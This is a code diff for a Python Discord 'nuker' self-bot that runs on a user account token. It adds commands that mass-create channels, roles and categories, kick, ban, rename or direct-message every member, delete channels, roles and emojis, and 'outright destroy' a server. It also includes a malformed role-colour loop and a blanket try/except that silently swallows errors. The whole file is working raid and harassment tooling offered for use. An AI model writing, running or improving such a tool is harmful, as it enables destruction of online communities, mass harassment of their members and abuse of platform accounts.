@@ -19,18 +19,25 @@ from discord.ext import commands
 
 
 
+
+
 print ("Loading..")
 
-
-bot = commands.Bot(command_prefix=prefix)
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
 bot.remove_command("help")
 
 
 @bot.event
 async def on_ready():
     print ("Ready to ruin >:)")
-    activity = discord.Activity(name='kids', type=discord.ActivityType.watching)
-    await bot.change_presence(activity=activity)
+
+
+try:
+    async def self_check(ctx):
+        if bot.user.id == ctx.message.author.id:
+            return True
+        else:
+            return False
 
 
     class MemberRoles(commands.MemberConverter):
@@ -38,69 +45,59 @@ async def on_ready():
         member = await super().convert(ctx, argument)
         return [role.name for role in member.roles[1:]]
 
-    @bot.command(pass_context=True)
-    async def spam(self, ctx, *, username:str):
-        """Unbans the user with the specifed name from the server"""
-        try:
-            banlist = await ctx.guild.bans()
-        except discord.errors.Forbidden:
-            await ctx.send(Language.get("moderation.no_ban_perms", ctx))
-            return
-        user = None
-        for ban in banlist:
-            if ban.user.name == username:
-                user = ban.user
-        if user is None:
-            await ctx.send(Language.get("moderation.user_not_banned", ctx).format(username))
-            return
-        await ctx.guild.unban(user)
-        await ctx.send(Language.get("moderation.unban_success", ctx).format(user))
+    @commands.check(self_check)
+    @bot.command()
+    async def rcolor(ctx):
+        guild = ctx.guild
+        for i in range(499):
+          await discord.edit_role(server=586535646550687744, role=586536287792660491, colour=discord.Colour(0xFF0000))
+          time.sleep(2)
 
-
+    @commands.check(self_check)
     @bot.command()
     async def duck(ctx):
         duckimg = str(requests.get('https://random-d.uk/api/v1/random').json()['url'])
         await ctx.send(duckimg)
 
-
+    @commands.check(self_check)
     @bot.command()
     async def ducks(ctx):
-        for i in range(0, 499):
+        for i in range(499):
           print('Sending Image Of Duck')
           duckimg = str(requests.get('https://random-d.uk/api/v1/random').json()['url'])
           await ctx.send(duckimg)
 
-
+    @commands.check(self_check)
     @bot.command()
     async def roles(ctx, *, member: MemberRoles):
         await ctx.send('I see the following roles: ' + ', '.join(member))
 
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def cchannels(ctx, string):
         guild = ctx.message.guild
         await ctx.message.delete()
-        for i in range(0, 499):
+        for i in range(499):
             print ("The channel " + string + " has been created in " + ctx.guild.name)
             await guild.create_text_channel(string)
 
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def croles(ctx, string):
         guild = ctx.guild
         colour = discord.Colour(0xFF0000)
         await ctx.message.delete()
         print ("The role " + string + " has been created in " + ctx.guild.name)
-        for x in range(0, 250):
+        for x in range(250):
            await guild.create_role(name=string, colour=discord.Colour(0xFF0000))
 
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def ccategories(ctx, string):
         guild = ctx.message.guild
         print ("The category " + string + " has been created in " + ctx.guild.name)
         await ctx.message.delete()
-        for x in range(0, 499):
+        for x in range(499):
           await guild.create_category(string)
 
     @bot.command(pass_context=True)
@@ -108,9 +105,10 @@ async def on_ready():
         guild = ctx.message.guild
         print ("The voice channel " + string + " has been created in " + ctx.guild.name)
         await ctx.message.delete()
-        for x in range(0, 499):
+        for x in range(499):
           await guild.create_voice_channel(string)
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def kall(ctx):
         await ctx.message.delete()
@@ -121,8 +119,9 @@ async def on_ready():
             except:
                 print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
         print ("Action Completed: kall")
+    # Kicks every member in a server.
 
-
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def ball(ctx):
         await ctx.message.delete()
@@ -135,6 +134,7 @@ async def on_ready():
         print ("Action Completed: ball")
 
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def nickclear(ctx):
         for user in list(ctx.guild.members):
@@ -146,6 +146,8 @@ async def on_ready():
             print("Action Completed: nickclear")
 
 
+
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def rall(ctx, rename_to):
         await ctx.message.delete()
@@ -157,6 +159,7 @@ async def on_ready():
                 print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}. Lacking Permissions?")
         print ("Action Completed: rall")
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def mall(ctx, *, message):
         await ctx.message.delete()
@@ -168,6 +171,7 @@ async def on_ready():
                 print(f"{user.name} has NOT recieved the message.")
         print("Action Completed: mall")
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def dall(ctx, condition):
         if condition.lower() == "channels":
@@ -215,6 +219,7 @@ async def on_ready():
                     print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
             print ("Action Completed: dall all")
 
+    @commands.check(self_check)
     @bot.command(pass_context=True)
     async def destroy(ctx):
         await ctx.message.delete()
@@ -243,6 +248,10 @@ async def on_ready():
             except:
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
         print ("Action Completed: destroy")
+    # Outright destroys a server.
 
+except:
+    pass
 
-bot.run(token)
+bot.run(token, bot=False)
+# Starts the bot by passing it a token and telling it it isn't really a bot.
